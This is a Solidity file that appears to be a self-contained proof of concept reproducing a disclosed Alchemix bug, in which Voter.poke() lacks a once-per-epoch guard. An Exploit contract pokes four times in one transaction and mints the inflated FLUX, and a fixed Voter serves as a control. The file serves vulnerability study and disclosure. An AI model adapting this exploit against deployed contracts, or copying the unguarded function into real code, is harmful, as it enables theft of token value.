// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — Unauthorized minting of unlimited FLUX in 1 transaction
    (Immunefi, infosec_us_team, finding #38109)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. Voter.poke()
    is inlined VERBATIM — missing its `onlyNewEpoch(_tokenId)` guard — calling
    into `_vote` -> `FluxToken.accrueFlux` exactly as in the real contracts.
    The Exploit deploys a reduced VotingEscrow + FluxToken + Voter, calls
    poke() repeatedly within a SINGLE transaction, and shows the accrued
    unclaimed FLUX balance multiplies once per call instead of being capped
    to one accrual per epoch (no fork, no cheatcodes).

    Root cause: `poke(uint256 _tokenId)` is missing the `onlyNewEpoch(_tokenId)`
    modifier that is supposed to ensure rewards are only accrued once per
    epoch. Without it, calling poke() N times in the same transaction calls
    `_vote` -> `FluxToken.accrueFlux(_tokenId)` N times, and accrueFlux
    unconditionally does `unclaimedFlux[_tokenId] += claimableFlux(_tokenId)`
    every single call — so N calls accrue N times the legitimate one-time
    amount, then `claimFlux` mints that inflated balance as real FLUX tokens.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced veALCX: a locked position accrues a fixed claimable FLUX
///         amount per epoch. In the real system this derives from the
///         position's locked balance/boost; here it is a fixed per-token
///         constant, which is all `accrueFlux` actually reads.
contract VotingEscrow {
    mapping(uint256 => uint256) public claimableFluxOf;

    function setClaimable(uint256 tokenId, uint256 amount) external {
        claimableFluxOf[tokenId] = amount;
    }

    function claimableFlux(uint256 tokenId) external view returns (uint256) {
        return claimableFluxOf[tokenId];
    }
}

interface IVotingEscrowFlux {
    function claimableFlux(uint256 tokenId) external view returns (uint256);
}

/// @notice Reduced FluxToken: accrues unclaimed FLUX per veALCX position and
///         mints real ERC20 balance on claim. Mirrors accrueFlux/claimFlux.
contract FluxToken {
    address public voter;
    IVotingEscrowFlux public votingEscrow;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public unclaimedFlux;
    mapping(address => uint256) public balanceOf;

    function setVoter(address _voter) external {
        voter = _voter;
    }

    function setVotingEscrow(address _ve) external {
        votingEscrow = IVotingEscrowFlux(_ve);
    }

    function setOwner(uint256 tokenId, address _owner) external {
        ownerOf[tokenId] = _owner;
    }

    /// @notice Verbatim: accrue the position's per-epoch claimable amount.
    ///         Callable only by the Voter — but the Voter's own guard against
    ///         repeated accrual within the same epoch is what's missing.
    function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = votingEscrow.claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }

    function getUnclaimedFlux(uint256 _tokenId) external view returns (uint256) {
        return unclaimedFlux[_tokenId];
    }

    function claimFlux(uint256 _tokenId, uint256 _amount) external {
        require(msg.sender == ownerOf[_tokenId], "not owner");
        require(_amount <= unclaimedFlux[_tokenId], "insufficient unclaimed");
        unclaimedFlux[_tokenId] -= _amount;
        balanceOf[msg.sender] += _amount;
    }
}

/// @notice Vulnerable Voter: poke() is missing the onlyNewEpoch(_tokenId) guard.
contract Voter {
    FluxToken public flux;

    constructor(FluxToken _flux) {
        flux = _flux;
    }

    // @> VULN: missing `onlyNewEpoch(_tokenId)` — nothing stops this being
    //          called any number of times within a single transaction.
    function poke(uint256 _tokenId) public {
        _vote(_tokenId);
    }
    // FIX: function poke(uint256 _tokenId) public onlyNewEpoch(_tokenId) { _vote(_tokenId); }

    function _vote(uint256 _tokenId) internal {
        flux.accrueFlux(_tokenId);
    }
}

/// @notice Fixed Voter, for the control test: a per-epoch guard caps accrual
///         to once per epoch no matter how many times poke() is called.
contract VoterFixed {
    FluxToken public flux;
    mapping(uint256 => uint256) public lastPokeEpoch;
    uint256 public epoch = 1;

    constructor(FluxToken _flux) {
        flux = _flux;
    }

    modifier onlyNewEpoch(uint256 _tokenId) {
        require(lastPokeEpoch[_tokenId] != epoch, "already accrued this epoch");
        lastPokeEpoch[_tokenId] = epoch;
        _;
    }

    function poke(uint256 _tokenId) public onlyNewEpoch(_tokenId) {
        _vote(_tokenId);
    }

    function _vote(uint256 _tokenId) internal {
        flux.accrueFlux(_tokenId);
    }
}

/// @notice Orchestrates the same-transaction repeated-poke attack: unclaimed
///         FLUX accrues once per poke() call instead of once per epoch, then
///         the inflated balance is minted as real FLUX via claimFlux.
contract Exploit {
    VotingEscrow public veALCX;
    FluxToken public flux;
    Voter public voter;

    uint256 public constant TOKEN_ID = 1;
    uint256 public constant CLAIMABLE_PER_EPOCH = 1 ether;
    uint256 public constant POKE_COUNT = 4;

    constructor() {
        veALCX = new VotingEscrow();
        flux = new FluxToken();
        voter = new Voter(flux);

        flux.setVoter(address(voter));
        flux.setVotingEscrow(address(veALCX));
        flux.setOwner(TOKEN_ID, address(this));
        veALCX.setClaimable(TOKEN_ID, CLAIMABLE_PER_EPOCH);
    }

    function run() external {
        // Attacker calls poke() repeatedly within this SINGLE transaction —
        // no time warp, no new epoch, just repeated calls.
        for (uint256 i = 0; i < POKE_COUNT; i++) {
            voter.poke(TOKEN_ID);
        }

        uint256 unclaimed = flux.getUnclaimedFlux(TOKEN_ID);
        // HARM #1: unclaimed FLUX has multiplied by the number of poke() calls,
        // instead of being capped at one epoch's worth.
        require(unclaimed == CLAIMABLE_PER_EPOCH * POKE_COUNT, "harm not demonstrated: accrual should multiply per poke call");

        // Attacker mints the fully inflated balance as real FLUX.
        flux.claimFlux(TOKEN_ID, unclaimed);

        // HARM #2: the attacker's real FLUX balance is 4x the legitimate
        // one-time accrual, minted from a single position in one transaction.
        require(flux.balanceOf(address(this)) == CLAIMABLE_PER_EPOCH * POKE_COUNT, "harm not demonstrated: inflated FLUX not minted");
    }
}
